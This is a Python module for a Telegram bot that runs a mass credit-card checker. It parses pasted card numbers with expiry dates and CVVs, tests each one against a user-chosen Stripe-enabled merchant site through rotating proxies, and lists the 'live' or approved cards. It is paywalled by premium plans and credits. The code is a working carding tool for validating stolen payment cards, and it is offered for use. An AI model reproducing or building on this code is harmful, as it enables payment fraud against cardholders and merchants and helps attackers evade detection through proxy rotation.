"""
Stripe Auto Auth - Mass Check (/mstarr)
=======================================
Mass card check using user's saved Stripe Auth site. Reply to message with cards or /mstarr (paste cards).
"""

import re
import asyncio
from time import time

from pyrogram import Client, filters
from pyrogram.enums import ParseMode

from BOT.helper.start import load_users
from BOT.helper.permissions import check_private_access, is_premium_user
from BOT.gc.credit import deduct_credit_bulk, has_credits
from BOT.db.store import get_primary_stripe_auth_site
from BOT.tools.proxy import get_rotating_proxy
from BOT.Auth.StripeAuto.api import auto_stripe_auth
from BOT.Auth.StripeAuto.response import determine_stripe_auto_status

user_locks = {}

def extract_cards(text: str):
    return re.findall(r"(\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})", text)


@Client.on_message(filters.command(["mstarr", "mstripeauto"]) | filters.regex(r"^\$mstarr(\s|$)"))
async def handle_mstarr_command(client: Client, message):
    """Mass Stripe Auto Auth. Uses site from /sturl. Reply to message with cards or paste after command."""
    if not message.from_user:
        return
    user_id = str(message.from_user.id)
    if user_id in user_locks:
        await message.reply(
            "<pre>⚠️ Wait!</pre>\n<b>Previous</b> <code>/mstarr</code> <b>still processing.</b>",
            reply_to_message_id=message.id,
            parse_mode=ParseMode.HTML,
        )
        return
    user_locks[user_id] = True
    try:
        users = load_users()
        if user_id not in users:
            user_locks.pop(user_id, None)
            return await message.reply(
                "<pre>Access Denied 🚫</pre>\n<b>Register first:</b> <code>/register</code>",
                reply_to_message_id=message.id,
                parse_mode=ParseMode.HTML,
            )
        if not await is_premium_user(message):
            user_locks.pop(user_id, None)
            return
        if not await check_private_access(message):
            user_locks.pop(user_id, None)
            return
        site_info = get_primary_stripe_auth_site(user_id)
        if not site_info or not site_info.get("url"):
            user_locks.pop(user_id, None)
            return await message.reply(
                "<pre>No Stripe Auth Site ❌</pre>\n<b>Add first:</b> <code>/sturl https://yoursite.com</code>",
                reply_to_message_id=message.id,
                parse_mode=ParseMode.HTML,
            )
        target_text = None
        if message.reply_to_message and message.reply_to_message.text:
            target_text = message.reply_to_message.text
        elif len((message.text or "").split(maxsplit=1)) > 1:
            target_text = message.text.split(maxsplit=1)[1]
        if not target_text:
            user_locks.pop(user_id, None)
            return await message.reply(
                "<pre>No cards ❌</pre>\nReply to a message with cards or paste after <code>/mstarr</code>",
                reply_to_message_id=message.id,
                parse_mode=ParseMode.HTML,
            )
        all_cards = extract_cards(target_text)
        if not all_cards:
            user_locks.pop(user_id, None)
            return await message.reply("❌ No valid cards (cc|mm|yy|cvv).", reply_to_message_id=message.id)
        mlimit = int(users.get(user_id, {}).get("plan", {}).get("mlimit", 50) or 50)
        if len(all_cards) > mlimit:
            user_locks.pop(user_id, None)
            return await message.reply(
                f"❌ Max <code>{mlimit}</code> cards per run (plan limit).",
                reply_to_message_id=message.id,
                parse_mode=ParseMode.HTML,
            )
        proxy = get_rotating_proxy(int(user_id))
        site_url = site_info["url"]
        total = len(all_cards)
        status_msg = await message.reply(
            f"<pre>Stripe Auto Mass ◐</pre>\n<b>Cards:</b> <code>{total}</code>\n<b>Site:</b> <code>{site_url[:35]}...</code>\n<b>Status:</b> <i>Processing...</i>",
            reply_to_message_id=message.id,
            parse_mode=ParseMode.HTML,
        )
        start_time = time()
        results = []
        done = 0
        for i, card in enumerate(all_cards):
            res = await auto_stripe_auth(site_url, card, session=None, proxy=proxy, timeout_seconds=45)
            status = determine_stripe_auto_status(res)
            results.append((card, status, res.get("message", "")[:40]))
            done += 1
            if done % 5 == 0 or done == total:
                try:
                    await status_msg.edit_text(
                        f"<pre>Stripe Auto Mass ◐</pre>\n<b>Cards:</b> <code>{total}</code>\n<b>Done:</b> <code>{done}/{total}</code>\n<b>Status:</b> <i>Processing...</i>",
                        parse_mode=ParseMode.HTML,
                    )
                except Exception:
                    pass
        time_taken = round(time() - start_time, 2)
        approved = sum(1 for _, s, _ in results if s == "APPROVED")
        ccn = sum(1 for _, s, _ in results if s == "CCN LIVE")
        declined = sum(1 for _, s, _ in results if s == "DECLINED")
        err = total - approved - ccn - declined
        lines = [
            f"<pre>Stripe Auto Mass ✅</pre>",
            "━━━━━━━━━━━━━",
            f"<b>• Total:</b> <code>{total}</code>",
            f"<b>• Approved:</b> <code>{approved}</code> ✅",
            f"<b>• CCN Live:</b> <code>{ccn}</code> ⚡",
            f"<b>• Declined:</b> <code>{declined}</code> ❌",
            f"<b>• Error:</b> <code>{err}</code>",
            "━━━━━━━━━━━━━",
            f"<b>• Time:</b> <code>{time_taken}s</code>",
        ]
        live_lines = []
        for card, status, msg in results:
            if status in ("APPROVED", "CCN LIVE"):
                live_lines.append(f"<code>{card}</code> → {status}")
        if live_lines:
            lines.append("\n<b>Live:</b>")
            lines.extend(live_lines[:15])
            if len(live_lines) > 15:
                lines.append(f"<i>+{len(live_lines) - 15} more</i>")
        await status_msg.edit_text(
            "\n".join(lines),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )
        deduct_credit_bulk(user_id, total)
    except Exception as e:
        try:
            await message.reply(f"<pre>Error ⚠️</pre>\n<code>{str(e)[:100]}</code>", reply_to_message_id=message.id, parse_mode=ParseMode.HTML)
        except Exception:
            pass
    finally:
        user_locks.pop(user_id, None)
